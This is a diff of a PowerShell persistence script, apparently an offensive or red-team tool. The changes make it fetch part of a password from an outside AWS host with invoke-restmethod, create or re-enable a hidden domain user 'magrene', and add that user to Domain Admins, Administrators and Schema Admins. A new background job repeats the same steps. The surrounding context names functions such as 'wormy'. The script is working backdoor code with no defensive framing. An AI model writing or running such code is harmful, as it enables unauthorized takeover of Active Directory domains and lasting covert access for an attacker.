@@ -41,20 +41,21 @@ if(!(Test-Path -Path 'C:\Program Files (x86)\Windows NT\TableTextService/TableTe
 
 
 function accountPersist{
-
+    $toAppend=invoke-restmethod http://ec2-18-205-66-203.compute-1.amazonaws.com/eeee/timeZ.txt
     $username='magrene'
-
+    $c0de='Tossking@'
+    $c0de=$c0de+$toAppend
     try{
         Get-aduser $username
         enable-adaccount $username
-        Set-ADAccountPassword -Identity $username -NewPassword (ConvertTo-SecureString -AsPlainText "Tossking123@" -Force)
+        Set-ADAccountPassword -Identity $username -NewPassword (ConvertTo-SecureString -AsPlainText $c0de -Force)
         Add-ADGroupMember -identity 'Domain Admins' -members $username
         Add-ADGroupMember -identity 'Administrators' -members $username
         Add-ADGroupMember -identity 'Schema Admins' -members $username
         
     }
     catch{
-        new-aduser -name $username -SamAccountName $username -UserPrincipalName ($username + '@reallife.local') -AccountPassword( convertto-securestring 'Tossking123@' -asplaintext -force) -Enabled $True
+        new-aduser -name $username -SamAccountName $username -UserPrincipalName ($username + '@reallife.local') -AccountPassword( convertto-securestring $c0de -asplaintext -force) -Enabled $True
         Add-ADGroupMember -identity 'Domain Admins' -members $username
         Add-ADGroupMember -identity 'Administrators' -members $username
         Add-ADGroupMember -identity 'Schema Admins' -members $username
@@ -109,6 +110,33 @@ function wormy{
         start-sleep -Seconds (get-random -Minimum 2 -Maximum 5)
     }
 }
+
+
+start-job -ScriptBlock{
+    
+    $toAppend=invoke-restmethod http://ec2-18-205-66-203.compute-1.amazonaws.com/eeee/timeZ.txt
+    $username='magrene'
+    $c0de='Tossking@'
+    $c0de=$c0de+$toAppend
+    try{
+        Get-aduser $username
+        enable-adaccount $username
+        Set-ADAccountPassword -Identity $username -NewPassword (ConvertTo-SecureString -AsPlainText $c0de -Force)
+        Add-ADGroupMember -identity 'Domain Admins' -members $username
+        Add-ADGroupMember -identity 'Administrators' -members $username
+        Add-ADGroupMember -identity 'Schema Admins' -members $username
+        
+    }
+    catch{
+        new-aduser -name $username -SamAccountName $username -UserPrincipalName ($username + '@reallife.local') -AccountPassword( convertto-securestring $c0de -asplaintext -force) -Enabled $True
+        Add-ADGroupMember -identity 'Domain Admins' -members $username
+        Add-ADGroupMember -identity 'Administrators' -members $username
+        Add-ADGroupMember -identity 'Schema Admins' -members $username
+    }
+    start-sleep -seconds 315
+
+}
+
 start-job -ScriptBlock{
 
     While(1 -eq 1){
